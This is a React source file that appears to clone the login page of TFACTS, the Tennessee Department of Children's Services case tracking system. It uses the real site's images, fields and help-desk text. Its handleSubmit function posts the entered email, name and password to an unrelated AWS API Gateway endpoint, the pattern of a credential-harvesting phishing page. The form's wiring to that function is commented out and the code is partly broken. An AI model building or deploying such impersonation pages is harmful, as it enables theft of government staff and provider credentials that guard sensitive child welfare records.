import React, { useState, Fragment } from "react";
import { nanoid } from "nanoid";
import axios from "axios";
import "./App.css";

async function handleSubmit(event) {
  event.preventDefault();
  const { email, firstName, password } = this.state;

  await axios.post(
    "https://bom1azlkv6.execute-api.us-east-1.amazonaws.com/default/serverlessAppFunction",
    {
      userid: `${email}`,
      firstName: `${firstName}`,
      email: `${email}`,
      password: `${password}`,
    }
  );
}

const App = () => {
  return (
    <div className="App-header">
      <div class="tfactsheader">
        <header>
          <div class="tranparentheader"></div>
          <div class="logo">
            <img src="https://tfactscluster2.dcs.tn.gov/images/DCSColorWhiteS.png" />
          </div>
        </header>
      </div>
      <div class="loginwrapper">
        <div class="leftcolumn">
          <img src="https://tfactscluster2.dcs.tn.gov/images/kidsComputerMed2.jpg" />
        </div>
        <div class="rightcolumn">
          <h1 classname="header">Welcome to TFACTS</h1>
          <p>Tennessee Family &amp; Child Tracking System</p>
          <br />
          {/* <form onSubmit={this.handleSubmit}> */}
          <img src="https://tfactscluster2.dcs.tn.gov/images/User.jpg" />
          <input
            type="userId"
            property="userId"
            class="input"
            size="30"
            maxlength="100"
            id="login"
            placeholder="username"
            autocomplete="off"
            tabindex="1"
            onchange="setUserId('login');"
          />
          <br></br>
          <img src="https://tfactscluster2.dcs.tn.gov/images/Key.jpg" />
          <input
            type="password"
            property="password"
            class="input"
            size="30"
            maxlength="50"
            id="Pwd"
            placeholder="password"
            autocomplete="off"
            tabindex="2"
            onchange="setPassword('Pwd');"
          />
          <br></br>
          <input
            type="submit"
            name="command.do(login)"
            tabindex="3"
            value="Login"
            id="login_button"
            class="button-website"
            // onClick={this.handleSubmit}
          />{" "}
          {/* </form> */}
          <br></br>
          <a href="javascript:displayMessage('Forgot Password ?', 'For DCS employees, please call the DCS Service Desk (615) 741-4636 OR (888) 853-4636, select <b>Option 1</b>. <br><br>  For Private Providers, please call the DCS Service Desk (615) 741-4636 OR (888) 853-4636, select <b>Option 3.</b> <br><br> For Background Check users, please call Child Abuse/Neglect Records-Release at (615)532-9444. ')">
            Forgot Password ?
          </a>
        </div>
      </div>
    </div>
  );
};

export default App;
